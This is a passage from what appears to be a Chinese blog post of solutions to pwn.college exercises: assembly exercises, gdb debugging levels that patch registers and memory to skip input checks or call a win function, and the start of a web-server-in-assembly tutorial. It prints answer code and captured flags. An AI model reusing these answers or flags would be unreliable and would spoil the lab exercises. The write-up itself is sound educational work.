class="built_in">rax</span>, <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">jmp</span> [<span class="built_in">rax</span>]</span><br></pre></td></tr></table></figure>

<p>这里其实也有坑，需要好好把控<code>[]</code>会解析地址。例如下面的exp：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">jg</span> <span class="meta">default</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, [<span class="built_in">rsi</span> + <span class="built_in">rdi</span> * <span class="number">8</span>]</span><br><span class="line">    <span class="keyword">jmp</span> <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">default:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, [<span class="built_in">rsi</span> + <span class="number">0x20</span>]</span><br><span class="line">    <span class="keyword">jmp</span> <span class="built_in">rax</span></span><br></pre></td></tr></table></figure>



<h4 id="27-average-loop"><a href="#27-average-loop" class="headerlink" title="27. average-loop"></a>27. average-loop</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rcx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">loop_start:</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">rax</span>, [<span class="built_in">rbx</span>]</span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rcx</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">rbx</span>, <span class="number">0x8</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rcx</span>, <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">jg</span> loop_end</span><br><span class="line">    <span class="keyword">jmp</span> loop_start</span><br><span class="line"><span class="symbol">loop_end:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">div</span> <span class="built_in">rbx</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<blockquote>
<p>依然是要注意<code>[]</code>的使用，要认知是取内存指向的值，还是取内存进行加减。</p>
</blockquote>
<h4 id="28-count-non-zero"><a href="#28-count-non-zero" class="headerlink" title="28. count-non-zero"></a>28. count-non-zero</h4><p>感觉主要问题是，我没理解题目的意思。理解后就很简单了。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">loop_start:</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rdi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">je</span> loop_end</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">bl</span>, [<span class="built_in">rdi</span>]</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">bl</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">je</span> loop_end</span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">jmp</span> loop_start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">loop_end:</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="29-string-lower"><a href="#29-string-lower" class="headerlink" title="29. string lower"></a>29. string lower</h4><p>这个还行，一遍过了。还记得系统调用的时候，第一个参数是用<code>rdi</code>存储，第二个参数是用<code>rsi</code>存储</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rdi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">jne</span> loop_start</span><br><span class="line">    <span class="keyword">jmp</span> done</span><br><span class="line"><span class="symbol">loop_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">cl</span>, [<span class="built_in">rdi</span>]</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">cl</span>, <span class="number">0x00</span></span><br><span class="line">    <span class="keyword">je</span> done</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">cl</span>, <span class="number">0x5a</span></span><br><span class="line">    <span class="keyword">jle</span> exe_1</span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">jmp</span> loop_start</span><br><span class="line"><span class="symbol">exe_1:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rcx</span>, <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0x403000</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, [<span class="built_in">rdi</span>]</span><br><span class="line">    <span class="keyword">call</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rcx</span></span><br><span class="line">    <span class="keyword">mov</span> [<span class="built_in">rdi</span>], <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">jmp</span> loop_start</span><br><span class="line"><span class="symbol">done:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">ret</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="30-most-common-byte"><a href="#30-most-common-byte" class="headerlink" title="30. most-common-byte"></a>30. most-common-byte</h4><p>这道题卡了半天吧得，主要是对寄存器不熟悉，重复用了一些寄存器，然后导致出现问题，后面用普通寄存器<code>r8~15</code>解决的，普通寄存器也得用，不然变量不够存的。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rbp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">rsp</span>, <span class="number">0x200</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rcx</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">loop_count_bytes:</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rcx</span>, <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">jge</span> loop_count_bytes_end</span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">dl</span>, [<span class="built_in">rdi</span> + <span class="built_in">rcx</span>]</span><br><span class="line">    <span class="keyword">movzx</span> <span class="built_in">rax</span>, <span class="built_in">dl</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="built_in">rbp</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">rbx</span>, <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbx</span>]</span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rcx</span></span><br><span class="line">    <span class="keyword">jmp</span> loop_count_bytes</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">loop_count_bytes_end:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rcx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">loop_find_max:</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rcx</span>, <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">jg</span> loop_find_max_end</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="built_in">rbp</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">rbx</span>, <span class="built_in">rcx</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r8b</span>, [<span class="built_in">rbx</span>]</span><br><span class="line">    <span class="keyword">movzx</span> <span class="built_in">rbx</span>, <span class="built_in">r8b</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rbx</span>, <span class="built_in">rdx</span></span><br><span class="line">    <span class="keyword">jle</span> skip_update</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="built_in">rcx</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rcx</span></span><br><span class="line">    <span class="keyword">jmp</span> loop_find_max</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">skip_update:</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">rcx</span></span><br><span class="line">    <span class="keyword">jmp</span> loop_find_max</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">loop_find_max_end:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsp</span>, <span class="built_in">rbp</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rbp</span></span><br><span class="line">    <span class="keyword">ret</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="Debugging-Refresher"><a href="#Debugging-Refresher" class="headerlink" title="Debugging Refresher"></a>Debugging Refresher</h3><h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>直接run一下，再continue一下就好了，gdb的简单使用</p>
<h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p<span class="symbol">/x</span> $r12</span><br><span class="line">$<span class="number">2</span> <span class="operator">=</span> <span class="number">0</span>x18215a7f83c98b8e</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Random <span class="params">value:</span> <span class="number">0</span>x18215a7f83c98b8e</span><br><span class="line">You <span class="params">input:</span> <span class="number">18215</span>a7f83c98b8e</span><br><span class="line">The correct answer <span class="params">is:</span> <span class="number">18215</span>a7f83c98b8e</span><br><span class="line">You win<span class="operator">!</span> Here is your <span class="params">flag:</span></span><br><span class="line">pwn.college&#123;ETe5riLiwE1X6xz1M0yCPK4-<span class="number">4</span>WH.<span class="number">0</span>VN0IDLxYTN1YzW&#125;</span><br></pre></td></tr></table></figure>



<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>通过在read处打断点，然后执行到read函数时，查看寄存器信息。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info registers </span><br><span class="line"><span class="built_in">rax</span>            <span class="number">0x7fff17b9e998</span>      <span class="number">140733591447960</span></span><br><span class="line"><span class="built_in">rbx</span>            <span class="number">0x5f31bbc71d10</span>      <span class="number">104667208424720</span></span><br><span class="line"><span class="built_in">rcx</span>            <span class="number">0x3</span>                 <span class="number">3</span></span><br><span class="line"><span class="built_in">rdx</span>            <span class="number">0x8</span>                 <span class="number">8</span></span><br><span class="line"><span class="built_in">rsi</span>            <span class="number">0x7fff17b9e998</span>      <span class="number">140733591447960</span></span><br><span class="line"><span class="built_in">rdi</span>            <span class="number">0x3</span>                 <span class="number">3</span></span><br><span class="line"><span class="built_in">rbp</span>            <span class="number">0x7fff17b9e9b0</span>      <span class="number">0x7fff17b9e9b0</span></span><br><span class="line"><span class="built_in">rsp</span>            <span class="number">0x7fff17b9e968</span>      <span class="number">0x7fff17b9e968</span></span><br><span class="line"><span class="built_in">r8</span>             <span class="number">0x3d</span>                <span class="number">61</span></span><br><span class="line"><span class="built_in">r9</span>             <span class="number">0x2c</span>                <span class="number">44</span></span><br><span class="line"><span class="built_in">r10</span>            <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line"><span class="built_in">r11</span>            <span class="number">0x246</span>               <span class="number">582</span></span><br><span class="line"><span class="built_in">r12</span>            <span class="number">0x5f31bbc712a0</span>      <span class="number">104667208422048</span></span><br><span class="line"><span class="built_in">r13</span>            <span class="number">0x7fff17b9eaa0</span>      <span class="number">140733591448224</span></span><br><span class="line"><span class="built_in">r14</span>            <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line"><span class="built_in">r15</span>            <span class="number">0x0</span>                 <span class="number">0</span></span><br><span class="line"><span class="built_in">rip</span>            <span class="number">0x5f31bbc71210</span>      <span class="number">0x5f31bbc71210</span> &lt;read@plt&gt;</span><br><span class="line">eflags         <span class="number">0x202</span>               [ IF ]</span><br></pre></td></tr></table></figure>

<p><code>rsi</code>作为read系统调用的buf参数，所以在随机数被set后，读取这个地址的值即可。（我发现不能断点给到read函数，因为从main中执行到read的时候，有其他函数会调用read，然后就会导致它read一直失败报错）</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">The random value has been <span class="keyword">set</span>!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Program <span class="comment">received signal SIGTRAP, Trace</span>/breakpoint trap.</span><br><span class="line"><span class="number">0x00005f31bbc71c64</span> in main ()</span><br><span class="line">(gdb) x /<span class="comment">8x 0x7fff17b9e998</span></span><br><span class="line">0x7fff17b9e998: 0xd81c082e      <span class="comment">0xc0e7d841      0x17b9eaa0      0x00007fff</span></span><br><span class="line">0x7fff17b9e9a8: 0x34e94700      <span class="comment">0xa2fdab81      0x00000000      0x00000000</span></span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Random <span class="comment">value: c0e7d841d81c082e</span></span><br><span class="line">You <span class="comment">input: c0e7d841d81c082e</span></span><br><span class="line">The <span class="comment">correct answer is: c0e7d841d81c082e</span></span><br><span class="line">You <span class="comment">win! Here is your flag:</span></span><br><span class="line"></span><br><span class="line">Breakpoint <span class="comment">1, 0x00005f31bbc71210 in read@plt ()</span></span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">pwn.college&#123;s102MI2GzaSB-30x2SjuMIlWzDy.0lN0IDLxYTN1YzW&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Inferior <span class="comment">1 (process 4714) exited normally]</span></span><br></pre></td></tr></table></figure>

<p>没毛病！至于为什么这个随机值是反着的，存储的是小端序，手动改成大端序才行。而且输出是以4字节为单位的，所以只需要将八字节反向一下即可。类似地，以一个字节为单位输出，也可以手动转换</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x /8x <span class="number">0x7ffccd2aa938</span></span><br><span class="line"><span class="number">0x7ffccd2aa938</span>: <span class="number">0x30</span>    <span class="number">0xe5</span>    <span class="number">0x4d</span>    <span class="number">0x5b</span>    <span class="number">0xce</span>    <span class="number">0xe0</span>    <span class="number">0x9a</span>    <span class="number">0x51</span></span><br><span class="line">(gdb) 519ae0ce5b4de530</span><br></pre></td></tr></table></figure>

<p>**PS：**在后续的学习中，发现可以使用x&#x2F;gx 以8字节为单位输出</p>
<h4 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h4><p>我也不知道是不是我第三关的方法用错了，第四关就是使用第三关的方法，一直重复，一直读取read系统调用时<code>rsi</code>寄存器的那个地址，并且在<code>scanf</code>系统调用前打个断点，这样方便我们读取这个随机值。重复5次还是几次就能拿到flag了。</p>
<h4 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h4><p>使用gdb脚本</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">start</span></span><br><span class="line"><span class="keyword">break</span> *main+<span class="number">704</span></span><br><span class="line">commands</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$rsi_buf</span> = <span class="variable">$rsi</span></span><br><span class="line">    printf <span class="string">&quot;buf_addr value: %llx\n&quot;</span>, <span class="variable">$rsi_buf</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">break</span> *main+<span class="number">752</span></span><br><span class="line">commands</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$local_variable</span> = *(unsigned long long*)(<span class="variable">$rsi_buf</span>)</span><br><span class="line">    printf <span class="string">&quot;Random value: %llx\n&quot;</span>, <span class="variable">$local_variable</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>呃，这个脚本不是完全的自动化，但是手动复制输入给程序，重复几次后就能获得到flag了。但是实际上应该是可以做到自动化输入的，或许可以借助python脚本来写，或者直接改内存。</p>
<h4 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h4><p>改寄存器的值做不到哇，<code>scanf</code>函数是通过调用多次<code>read</code>系统调用，每次都只写入<strong>1个字节</strong></p>
<p>我麻了，尝试那么多次。实际上应该跳过scanf,而不是重定向标准输入。只需要获取scanf所读取的内存地址，在这个地址将那个随机值放进去，然后控制<code>rip</code>寄存器，跳过scanf就好了。用一下exp会出现一个问题：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line"><span class="keyword">break</span> *main+<span class="number">572</span></span><br><span class="line">commands</span><br><span class="line">    silent</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$rsi_buf</span> = <span class="variable">$rsi</span></span><br><span class="line">    printf <span class="string">&quot;buf_addr value: %llx\n&quot;</span>, <span class="variable">$rsi_buf</span></span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">break</span> *main+<span class="number">606</span></span><br><span class="line">commands</span><br><span class="line">    silent</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$local_variable</span> = *(uint64_t*)(<span class="variable">$rsi_buf</span>)</span><br><span class="line">    printf <span class="string">&quot;Random value: %llx\n&quot;</span>, <span class="variable">$local_variable</span></span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$rbp</span></span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$rip</span>=<span class="variable">$rip</span> + <span class="number">0</span>x18</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">break</span> *main+<span class="number">637</span></span><br><span class="line">commands</span><br><span class="line">    ptype <span class="variable">$rsi</span></span><br><span class="line">    ptype <span class="variable">$local_variable</span></span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$rsi</span>=<span class="variable">$local_variable</span></span><br><span class="line">    info registers</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241030201710671.png" class="" title="image-20241030201710671">

<p>我仅仅修改了printf的内存，导致它输出的内容是一致的，但是后续的cmp指令所比较的，还是取的<code>rbp-0x18</code>地址的内容，这个内容我并没有修改，所以认定为不匹配。我直接修改<code>rbp-0x18</code>地址的内容为这个随机值即可。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line"><span class="keyword">break</span> *main+<span class="number">572</span></span><br><span class="line">commands</span><br><span class="line">    silent</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$rsi_buf</span> = <span class="variable">$rsi</span></span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">break</span> *main+<span class="number">606</span></span><br><span class="line">commands</span><br><span class="line">    silent</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$local_variable</span> = *(uint64_t*)(<span class="variable">$rsi_buf</span>)</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$rbp</span></span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$rip</span>=<span class="variable">$rip</span> + <span class="number">0</span>x18</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">break</span> *main+<span class="number">630</span></span><br><span class="line">commands</span><br><span class="line">    silent</span><br><span class="line">    <span class="built_in">set</span> *(uint64_t*)(<span class="variable">$rbp</span><span class="literal">-0x10</span>) = <span class="variable">$local_variable</span></span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>OK，自动化成功！</p>
<h4 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) call (void)<span class="built_in">win</span>()</span><br><span class="line">You win! Here is your flag:</span><br><span class="line">pwn.college&#123;kS6uX4HwFALgoHPYfILQokDmQwX<span class="selector-class">.0FM1IDLxYTN1YzW</span>&#125;</span><br></pre></td></tr></table></figure>

<p>gdb直接可以调用函数，其实在前面的关卡，我看到有个win函数，就修改过rip寄存器跳到win函数，直接能够获取flag。不过还是一步步做收获大些。毕竟这flag啥也不是</p>
<h4 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h4><p>因为程序是被损坏了，但是我认为<code>open</code>,<code>read</code>等系统调用应该都挺重要的，所以直接jump过去执行，单步执行来到<code>write</code>后就拿到flag了。</p>
<p>入口是从<code>win+47</code>位置开始的。</p>
<h3 id="Building-a-Web-Server"><a href="#Building-a-Web-Server" class="headerlink" title="Building a Web Server"></a>Building a Web Server</h3><h4 id="level1-1"><a href="#level1-1" class="headerlink" title="level1"></a>level1</h4><p>正常的exit汇编</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">60</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .data</span><br></pre></td></tr></table></figure>



<h4 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h4><p>要实现socket，其系统调用为41。原型<code>int socket(int domain, int type, int protocol);</code></p>
<p><code>socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=3</code></p>
<p>也就是说，domain为<code>AF_INET</code>，type为<code>SOCK_STREAM</code>，protocol为<code>IPPROTO_IP</code></p>
<p>其中，关于第一个参数说明如下：</p>
<ul>
<li><strong><code>AF_INET</code> (2):</strong> IPv4 地址族。</li>
<li><strong><code>AF_INET6</code> (10):</strong> IPv6 地址族。</li>
<li><strong><code>AF_UNIX</code> (1):</strong> Unix 套接字。 这些套接字用于进程间通信，通常在本地主机上使用。 它们不是基于网络的。</li>
